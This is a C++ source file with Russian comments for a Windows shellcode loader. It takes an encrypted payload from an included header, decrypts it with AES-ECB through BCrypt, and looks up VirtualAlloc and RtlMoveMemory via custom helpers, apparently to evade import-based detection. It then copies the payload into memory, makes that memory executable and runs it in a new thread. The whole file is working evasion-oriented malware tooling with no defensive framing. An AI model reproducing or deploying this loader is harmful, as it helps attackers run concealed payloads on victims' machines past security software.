#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <bcrypt.h>
#include "helpers.h"
#include "shellcode.h" // Включаем сгенерированный файл

#pragma comment(lib, "bcrypt.lib")

typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef VOID(WINAPI* RtlMoveMemory_t)(VOID UNALIGNED* Destination, const VOID UNALIGNED* Source, SIZE_T Length);

// Функция для удаления padding (PKCS7)
bool RemovePadding(BYTE* data, DWORD& length) {
    if (length == 0) return false;

    BYTE paddingValue = data[length - 1];
    if (paddingValue > 0 && paddingValue <= 16) {
        // Проверяем, что все байты padding содержат одинаковое значение
        for (DWORD i = length - paddingValue; i < length; i++) {
            if (data[i] != paddingValue) {
                return false;  // Неверный padding
            }
        }
        length -= paddingValue;  // Убираем padding
        return true;
    }
    return false;  // Неверный padding
}

bool DecryptAES(const BYTE* encryptedShellcode, DWORD length, const BYTE* key, DWORD keyLength, BYTE*& decryptedShellcode) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD result = 0;
    bool success = false;

    // Открываем алгоритм AES
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) {
        printf("Failed to open algorithm provider. Status: 0x%08x\n", status);
        return false;
    }

    // Устанавливаем режим цепочки (ECB)
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    if (status != 0) {
        printf("Failed to set chaining mode. Status: 0x%08x\n", status);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    // Генерация симметричного ключа на основе предоставленного ключа
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, keyLength, 0);
    if (status != 0) {
        printf("Failed to generate symmetric key. Status: 0x%08x\n", status);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    printf("Decryption key and algorithm initialized successfully.\n");

    // Проверка длины зашифрованных данных
    printf("Length of encrypted shellcode: %lu\n", length);
    if (length % 16 != 0) {
        printf("Error: Length of encrypted shellcode is not a multiple of 16 bytes.\n");
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    // Выделение памяти для расшифрованного шеллкода
    decryptedShellcode = new BYTE[length];
    if (!decryptedShellcode) {
        printf("Memory allocation for decrypted shellcode failed.\n");
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    // Дешифрование данных
    status = BCryptDecrypt(hKey, (PUCHAR)encryptedShellcode, length, NULL, NULL, 0, decryptedShellcode, length, &result, 0);
    if (status != 0) {
        printf("Shellcode decryption failed. Status: 0x%08x, Length: %lu\n", status, length);
        delete[] decryptedShellcode;
        decryptedShellcode = nullptr;
    }
    else {
        // Удаление padding
        if (!RemovePadding(decryptedShellcode, result)) {
            printf("Failed to remove padding.\n");
            delete[] decryptedShellcode;
            return false;
        }
        printf("Shellcode decrypted successfully. Decrypted length: %lu\n", result);
        success = true;
    }

    // Освобождение ресурсов
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return success;
}

unsigned char* decryptedShellcode = nullptr;

int main() {
    void* exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // Получаем адреса функций
    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"VirtualAlloc");
    RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"RtlMoveMemory");

    if (!pVirtualAlloc || !pRtlMoveMemory) {
        printf("Failed to get function addresses.\n");
        return 1;
    }

    unsigned int payload_len = sizeof(encryptedShellcode); // Убедитесь, что это 288 байт

    if (payload_len != 288) {
        printf("Payload length is incorrect: %u bytes\n", payload_len);
        return -1;
    }

    // Выделение памяти для payload
    exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL) {
        printf("Memory allocation failed.\n");
        return 1;
    }

    // Дешифрование payload
    if (!DecryptAES(encryptedShellcode, payload_len, key, sizeof(key), decryptedShellcode)) {
        printf("Decryption failed.\n");
        return 1;
    }

    // Копирование расшифрованного payload в выделенный буфер
    pRtlMoveMemory(exec_mem, decryptedShellcode, payload_len);

    // Делаем буфер исполняемым
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if (rv == 0) {
        printf("Failed to set memory as executable.\n");
        delete[] decryptedShellcode;
        return 1;
    }

    // Если всё прошло успешно, запускаем payload
    if (rv != 0) {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        if (th == NULL) {
            printf("Failed to create thread.\n");
            delete[] decryptedShellcode;
            return 1;
        }
        WaitForSingleObject(th, INFINITE);
    }

    delete[] decryptedShellcode;
    return 0;
}
